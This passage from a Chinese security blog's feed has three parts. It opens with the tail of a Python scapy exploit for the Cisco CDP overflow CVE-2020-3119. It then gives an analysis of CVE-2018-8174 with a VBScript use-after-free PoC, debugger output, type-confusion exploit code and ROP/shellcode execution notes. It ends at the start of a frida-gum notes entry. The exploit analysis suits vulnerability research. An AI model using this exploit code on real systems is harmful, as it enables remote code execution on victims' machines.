cdp.CDPMsgUnknown19(val=payload)</span><br><span class="line">    power_level = cdp.CDPMsgPower(power=<span class="number">16</span>)</span><br><span class="line">    cdp_packet = cdp_v2/deviceid/portid/address/cap/power_req/power_level</span><br><span class="line">    packet = l2_packet / cdp_packet</span><br><span class="line">    sendp(packet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">assert</span> offset_to_cmd !=<span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> libc_base <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf5000000</span>, <span class="number">0xf5fff000</span>, <span class="number">0x1000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(<span class="string">&#x27;[*] Exploiting...guess libc on &#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">            payload = gen(libc_base)</span><br><span class="line">            exploit(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    payload = gen(<span class="number">0xf5dd9000</span>)</span><br><span class="line">    exploit(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># main()</span></span><br><span class="line">    test()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://paper.seebug.org/1154/">CVE-2020-3119 Cisco CDP 协议栈溢出漏洞分析s</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h2&gt;&lt;p&gt;使用GNS3可以复现漏洞；使用&lt;a href=&quot;https://www.eve-ng.net/&quot;&gt;EVE&lt;/a&gt;也可以，一个定制化的Linux，提供一个仿真环境，我当时两个方法都测试了,GNS3有点小坑，最后在EVE上测试通过的。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="exploit" scheme="http://o0xmuhe.me/tags/exploit/"/>
    
    <category term="CDP" scheme="http://o0xmuhe.me/tags/CDP/"/>
    
    <category term="Cisco" scheme="http://o0xmuhe.me/tags/Cisco/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2018-8174 analysis</title>
    <link href="http://o0xmuhe.me/2020/02/20/CVE-2018-8174-analysis/"/>
    <id>http://o0xmuhe.me/2020/02/20/CVE-2018-8174-analysis/</id>
    <published>2020-02-19T16:49:23.000Z</published>
    <updated>2020-06-20T11:03:34.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2018-8174"><a href="#CVE-2018-8174" class="headerlink" title="CVE-2018-8174"></a>CVE-2018-8174</h1><a id="more"></a><h2 id="Basic-Info"><a href="#Basic-Info" class="headerlink" title="Basic Info"></a>Basic Info</h2><p>利用ole加载IE的0day完成利用。</p><ul><li>win7 sp1 x86</li><li>vbscript version : 5.8.9600.17420</li></ul><h2 id="vuln-✅"><a href="#vuln-✅" class="headerlink" title="vuln ✅"></a>vuln ✅</h2><p>poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;x-ua-compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=10&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;vbscript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">Dim array_a</span><br><span class="line">Dim array_b(1)</span><br><span class="line"></span><br><span class="line">Class Trigger</span><br><span class="line">    Private Sub Class Terminate()</span><br><span class="line"><span class="javascript">        <span class="built_in">Set</span> array_b(<span class="number">0</span>) = array_a(<span class="number">1</span>)</span></span><br><span class="line">        array_a(1) = 1</span><br><span class="line">    End Sub</span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">Sub UAF</span><br><span class="line">    ReDim array_a(1)</span><br><span class="line"><span class="javascript">    <span class="built_in">Set</span> array_a(<span class="number">1</span>) = New Trigger</span></span><br><span class="line">    Erase array_a</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub TriggerVuln</span><br><span class="line">    array_b(0) = 0</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub StartExploit</span><br><span class="line">    UAF</span><br><span class="line">    TriggerVuln</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">StartExploit</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15832345474144.jpg"></p><p>看起来是个UaF，结合poc来看：</p><ul><li>UAF函数里Redim了<code>array_a</code>，并且把它的值初始化为<code>Trigger</code>对象的一个实例，随后便删除了<code>array_a</code>对象</li><li><code>array_a</code>被删除的时候触发了Trigger的析构函数，这里面把<code>array_a(1)</code>赋值给<code>array_b(0)</code>，此时<code>array_b(0)</code>指向<code>Trigger</code>对象</li><li>随后<code>array_a(1)=1</code>是为了平衡引用计数，好获得一个野指针</li><li>随后的TriggerVuln函数里<code>array_b(0)</code>访问了已经释放的Trigger对象，导致UaF。</li></ul><p><strong>这个过程和之前看到的一些vbs的洞很像，都是一个模式。</strong></p><p>那么根据<code>!heap -p -a eax</code>的调用栈可以看到一个<code>!VbsErase+0x00000050</code>函数，这个应该是对应poc里的<code>Erase array_a</code>。</p><p>调用栈<code>k10</code>里看到的<code>vbscript!AssignVar</code> 应该对应<code>array_b(0) = 0</code>赋值语句。</p><p>Q:UaF的对象是？<br>A:VBScriptClass</p><p>Q:被释放对象的大小？<br>A:0x30<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15832495670898.jpg"><br>释放的时候，回调用这个对象的<code>VBScriptClass::Release</code>函数，在c++层vbs里的Trigger对象是VBScriptClass，释放的时候调用了Release函数，所以该对象的大小等信息，可以调这个函数。</p><p>释放前后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd esi</span><br><span class="line">01848fd0  6b60206c 00000002 0184cf78 07d29f88</span><br><span class="line">01848fe0  00000b64 00000000 00000000 08864efc</span><br><span class="line">01848ff0  00000001 0865efe4 00000000 00000000</span><br><span class="line">01849000  ???????? ???????? ???????? ????????</span><br><span class="line">01849010  ???????? ???????? ???????? ????????</span><br><span class="line">01849020  ???????? ???????? ???????? ????????</span><br><span class="line">01849030  ???????? ???????? ???????? ????????</span><br><span class="line">01849040  ???????? ???????? ???????? ????????</span><br><span class="line">0:007&gt; !heap -p -a esi</span><br><span class="line">    address 01848fd0 found in</span><br><span class="line">    _DPH_HEAP_ROOT @ 1781000</span><br><span class="line">    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">                                 8860ea0:          1848fd0               30 -          1848000             2000</span><br><span class="line">          vbscript!VBScriptClass::&#96;vftable&#39;</span><br><span class="line">    722c8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229</span><br><span class="line">    77225ede ntdll!RtlDebugAllocateHeap+0x00000030</span><br><span class="line">    771ea40a ntdll!RtlpAllocateHeap+0x000000c4</span><br><span class="line">    771b5ae0 ntdll!RtlAllocateHeap+0x0000023a</span><br><span class="line">    77039d45 msvcrt!malloc+0x0000008d</span><br><span class="line">    7703b0d7 msvcrt!operator new+0x0000001d</span><br><span class="line">    6b629f0c vbscript!VBScriptClass::Create+0x00000014</span><br><span class="line">    6b629e97 vbscript!CScriptRuntime::RunNoEH+0x00002c78</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b62a12e vbscript!CScriptRuntime::RunNoEH+0x00002c23</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74</span><br><span class="line">    6b60526e vbscript!CScriptRuntime::Run+0x000000c3</span><br><span class="line">    6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b</span><br><span class="line">    6b6059bd vbscript!CSession::Execute+0x00000156</span><br><span class="line">    6b605c6b vbscript!COleScript::ExecutePendingScripts+0x0000014f</span><br><span class="line">    6b629138 vbscript!COleScript::ParseScriptTextCore+0x0000023e</span><br><span class="line">    6b60c3b9 vbscript!COleScript::ParseScriptText+0x00000029</span><br><span class="line">    6496f1e5 MSHTML!CActiveScriptHolder::ParseScriptText+0x00000051</span><br><span class="line">    64a05f3a MSHTML!CScriptCollection::ParseScriptText+0x00000177</span><br><span class="line">    6496fd65 MSHTML!CScriptData::CommitCode+0x00000332</span><br><span class="line">    6496f973 MSHTML!CScriptData::Execute+0x00000286</span><br><span class="line">    649707d4 MSHTML!CHtmScriptParseCtx::Execute+0x00000130</span><br><span class="line">    649e9a52 MSHTML!CHtmParseBase::Execute+0x00000196</span><br><span class="line">    6476b333 MSHTML!CHtmPost::Broadcast+0x00000153</span><br><span class="line">    6476b0ef MSHTML!CHtmPost::Exec+0x000005d9</span><br><span class="line">    64a078c8 MSHTML!CHtmPost::Run+0x0000003d</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">0:007&gt; g</span><br><span class="line">(b4c.b64): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax&#x3D;01848fd0 ebx&#x3D;72540fd0 ecx&#x3D;00000009 edx&#x3D;00000009 esi&#x3D;08658fe0 edi&#x3D;00000009</span><br><span class="line">eip&#x3D;759e4971 esp&#x3D;0479b7f0 ebp&#x3D;0479b7f8 iopl&#x3D;0         nv up ei pl nz na po nc</span><br><span class="line">cs&#x3D;001b  ss&#x3D;0023  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;003b  gs&#x3D;0000             efl&#x3D;00010202</span><br><span class="line">OLEAUT32!VariantClear+0xb3:</span><br><span class="line">759e4971 8b08            mov     ecx,dword ptr [eax]  ds:0023:01848fd0&#x3D;????????</span><br></pre></td></tr></table></figure><h2 id="exploit-analysis"><a href="#exploit-analysis" class="headerlink" title="exploit analysis"></a>exploit analysis</h2><p>利用，找合适的对象占位，可以使用另一个<code>VBScriptClass</code>对象来占位，构造类型混淆去利用。</p><p>这个对象的结构:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01848fd0  6b60206c 00000002 0184cf78 07d29f88</span><br><span class="line">            vtable  refcnt    NameTbl</span><br><span class="line">01848fe0  00000b64 00000000 00000000 08864efc</span><br><span class="line">01848ff0  00000001 0865efe4 00000000 00000000</span><br></pre></td></tr></table></figure><p>NameTbl对象保存的是这个对象的 成员变量和方法，这个对象可以被用来做利用，重点关注。</p><p>这个对象大小 0x88，NameTbl对象从+0×48开始保存成员变量和成员函数的指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NameList *__thiscall <span class="title">NameList::NameList</span><span class="params">(<span class="keyword">int</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NameList *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">12</span>) = <span class="number">256</span>;</span><br><span class="line">  *(_DWORD *)<span class="keyword">this</span> = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">16</span>) = <span class="number">0x4000</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">52</span>) = <span class="keyword">this</span> + <span class="number">56</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">44</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">48</span>) = <span class="number">20</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">24</span>) = <span class="keyword">this</span> + <span class="number">20</span>;</span><br><span class="line">  result = (NameList *)<span class="keyword">this</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">32</span>) = <span class="number">15</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">28</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">36</span>) = <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)(<span class="keyword">this</span> + <span class="number">40</span>) = <span class="number">64</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="UAF函数-✅"><a href="#UAF函数-✅" class="headerlink" title="UAF函数  ✅"></a>UAF函数  ✅</h3><p>两次0-6的循环之后，UafArrayA 和 UafArrayB<br>里面的7个元素都指向了释放的 ClassTerminateA/B对象。。<br>随后立即用 ReuseClass对象占位，此时7个引用都指向这个新的ReuseClass。。。<br><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833047678730.jpg"></p><p>ClassTerminateA释放的时候:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:007&gt; dd 06776fd0  </span><br><span class="line">06776fd0  69a8206c 00000000 067cff78 07ebdf88</span><br><span class="line">06776fe0  000009c4 00000000 00000000 067d3efc</span><br><span class="line">06776ff0  00000000 07384fc4 00000000 067b0fd0</span><br><span class="line">06777000  ???????? ???????? ???????? ????????</span><br><span class="line">06777010  ???????? ???????? ???????? ????????</span><br><span class="line">06777020  ???????? ???????? ???????? ????????</span><br><span class="line">06777030  ???????? ???????? ???????? ????????</span><br><span class="line">06777040  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833058568255.jpg"></p><p>调试发现并没有占位成功，需要调整exp的占位部分。</p><p>应该是有碎片，所以ClassTerminateA创建又释放的时候没有用同一块内存…</p><p><strong>后面发现是pageheap的问题，不能开pageheap。</strong></p><h3 id="TypeConfusion函数-✅"><a href="#TypeConfusion函数-✅" class="headerlink" title="TypeConfusion函数 ✅"></a>TypeConfusion函数 ✅</h3><p>resueObjectA_arr和resueObjectA_int setProp给成员mem赋值。。<br>赋值成ReplacingClass_Array和ReplacingClass_Int 自动触发了getter回调。。。</p><p>两个Getter回调里做的事差不多，</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> ReplacingClass_Array</span><br><span class="line"><span class="keyword">Public</span> <span class="keyword">Default</span> <span class="keyword">Property</span> <span class="keyword">Get</span> Q</span><br><span class="line"><span class="keyword">Dim</span> objectImitatingArray</span><br><span class="line">Q=<span class="built_in">CDbl</span>(<span class="string">&quot;174088534690791e-324&quot;</span>)<span class="comment">&#x27; db 0, 0, 0, 0, 0Ch, 20h, 0, 0</span></span><br><span class="line"><span class="keyword">For</span> idx=<span class="number">0</span> <span class="keyword">To</span> <span class="number">6</span></span><br><span class="line">UafArrayA(idx)=<span class="number">0</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Set</span> objectImitatingArray=<span class="keyword">New</span> FakeReuseClass</span><br><span class="line">objectImitatingArray.mem = FakeArrayString</span><br><span class="line"><span class="keyword">For</span> idx=<span class="number">0</span> <span class="keyword">To</span> <span class="number">6</span></span><br><span class="line"><span class="keyword">Set</span> UafArrayA(idx)=objectImitatingArray</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Property</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Class</span></span><br></pre></td></tr></table></figure><p><code>ReuseClass.mem</code> 赋值为 <code>CDbl(&quot;174088534690791e-324&quot;)</code></p><p>随后释放了原本<code>UafArrayA</code>指向的内存，随后利用<br><code>Set objectImitatingArray=New FakeReuseClass</code>去占位，重新获取到原本对象的内存，此时就可以把 <code>ReuseClass</code>混淆成了<code>FakeReuseClass</code>对象。<br>之后 <code>objectImitatingArray.mem</code> 的赋值利用错位覆盖，伪造出了一个<code>Array</code>对象。</p><p>重点调试下这个混淆的过程：</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833192097066.jpg"></p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833197765548.jpg"></p><p>两个地址分别是<code>1e7c720</code>和<code>1e82fa8</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0:002&gt; dd 1e7c758 L4</span><br><span class="line">01e7c758  6b7e206c 00000007 01e7da70 01e79ef8</span><br><span class="line">0:002&gt; dd 01e7da70 + 0x34 L4</span><br><span class="line">01e7daa4  01e7daa8 01e81984 01e819b8 01e819f8</span><br><span class="line"></span><br><span class="line">0:002&gt; du 01e81984 +30</span><br><span class="line">01e819b4  &quot;p&quot;</span><br><span class="line">0:002&gt; du 01e819b8 +30</span><br><span class="line">01e819e8  &quot;SetProp&quot;</span><br><span class="line">0:002&gt; du 01e819f8+30</span><br><span class="line">01e81a28  &quot;mem&quot;</span><br></pre></td></tr></table></figure><p>类型混淆前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 01e819f8 L4</span><br><span class="line">01e819f8  00000000 00500053 00000050 00000000</span><br></pre></td></tr></table></figure><p>混淆之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 01e819f8 L4</span><br><span class="line">01e819f8  00000005 00000000 00000000 0000200c</span><br></pre></td></tr></table></figure><p>借用别人分析里的一个图</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833209544510.jpg"></p><p>这里的写是 在类型混淆的基础上，错位修改了成员类型。 (将VARIANT类型从String覆盖为Array)</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/15833209997788.jpg"></p><p>获得了一个 <code>0x7fffffff</code> 长的array用于读写内存。</p><h3 id="AAR-AAW-✅"><a href="#AAR-AAW-✅" class="headerlink" title="AAR/AAW ✅"></a>AAR/AAW ✅</h3><p>伪造的两个对象(+8)处的<code>NameList</code>对象是连续分配的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 第一个</span><br><span class="line">0:018&gt; dd 01bce438 L4</span><br><span class="line">01bce438  01bd2348 000000ac 00000100 00000100</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第二个</span><br><span class="line">0:018&gt; dd 01bce558 L4</span><br><span class="line">01bce558  01bd2578 000000ac 00000100 00000100</span><br></pre></td></tr></table></figure><p>成员也是连续分配的，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:018&gt; dd 01bce438 +0x34 L4</span><br><span class="line">01bce46c  01bce470 01bd234c 01bd2380 01bd23c0</span><br><span class="line">0:018&gt; dd 01bce558 +0x34 L4</span><br><span class="line">01bce58c  01bce590 01bd257c 01bd25b0 01bd25f0</span><br></pre></td></tr></table></figure><p>所以可以利用这个特性，第一个对象为造成了一个0x7fffffff长度的array，</p><p>伪造的int对象的mem成员在<code>fakearray</code>的范围里，所以<code>int.mem</code>是一个fakearray里的地址，指向特定的元素，那么只要使用<code>fakearray[int.mem]</code>就可以任意地址读写。</p><p>下面是手写的记录</p><p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/CVE-2018-8174/3EC513EA-E9A4-4CAD-BD50-FB9B087A4173_1_105_c.jpeg" alt="3EC513EA-E9A4-4CAD-BD50-FB9B087A4173_1_105"></p><h3 id="RCE-✅"><a href="#RCE-✅" class="headerlink" title="RCE ✅"></a>RCE ✅</h3><p>写ROP+shellcode到可控的数组中，触发执行，rop修改内存属性并跳到shellcode去执行。</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> TriggerCodeExecution</span><br><span class="line">resueObjectA_arr.mem(some_memory)=&amp;h4d</span><br><span class="line">Wscript.Echo(<span class="string">&quot;GO&quot;</span>)</span><br><span class="line">resueObjectA_arr.mem(some_memory+<span class="number">8</span>)=<span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>触发的时候，把这个元素的<code>VARIANT</code>类型修改为0x4d，随后<code>memClassA.mem(address + 8) = 0</code>触发了<code>AssignVar</code>函数。</p><p>代码流将按相应大小跳转到一个“函数指针数组”的结构。当类型为0x4d，将VARIANT中的值域压栈保存，并将该值域解析成vfTable，随后发生调用，可以成功劫持eip。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSYSAPI　NTSTATUS　NTAPI <span class="title">ZwContinue</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        IN PCONTEXT Context; </span></span></span><br><span class="line"><span class="function"><span class="params">        IN BOOLEAN TestAlert</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>这个函数调用时context参数可控，所以可以劫持流程，跳转到rop+shellcode里。</p><p><strong>这种做法可以bypass CFG</strong></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/Yt1g3r/CVE-2018-8174_EXP">exp from github</a></p><p><a href="https://bbs.pediy.com/thread-249933.htm">[原创]“深入”探索CVE-2018-8174</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CVE-2018-8174&quot;&gt;&lt;a href=&quot;#CVE-2018-8174&quot; class=&quot;headerlink&quot; title=&quot;CVE-2018-8174&quot;&gt;&lt;/a&gt;CVE-2018-8174&lt;/h1&gt;</summary>
    
    
    
    <category term="漏洞分析" scheme="http://o0xmuhe.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="IE" scheme="http://o0xmuhe.me/tags/IE/"/>
    
    <category term="office" scheme="http://o0xmuhe.me/tags/office/"/>
    
    <category term="vbs" scheme="http://o0xmuhe.me/tags/vbs/"/>
    
  </entry>
  
  <entry>
    <title>frida-gum代码阅读笔记</title>
    <link href="http://o0xmuhe.me/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>http://o0xmuhe.me/2019/11/15/frida-gum%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB/</id>
    <published>2019-11-15T09:54:02.000Z</published>
    <updated>2020-06-20T11:05:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言与预备知识"><a href="#0x00-前言与预备知识" class="headerlink" title="0x00 : 前言与预备知识"></a>0x00 : 前言与预备知识</h2><p><code>frida</code> :  frida是一个优秀的跨平台<code>Dynamic instrumentation toolkit</code>，具体可以看<a href="https://www.frida.re/">官网介绍</a></p><p><a href="https://www.ibm.com/developerworks/cn/linux/l-gobject/index.html">GObject对象系统</a></p><a id="more"></a><p>GObject这个比较重要，因为frida框架底层的hook框架Frida-gum是纯c写的，为了实现一些面向对象的编程，使用了Gobject。</p><p>注：本篇主要是看<code>interceptor</code>这种hook方式，针对函数头，之后会有一篇针对<code>Stalker</code> 模式的分析。</p><h2 id="0x01-项目构架"><a href="#0x01-项目构架" class="headerlink" title="0x01 : 项目构架"></a>0x01 : 项目构架</h2><p>直接拉下来的代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 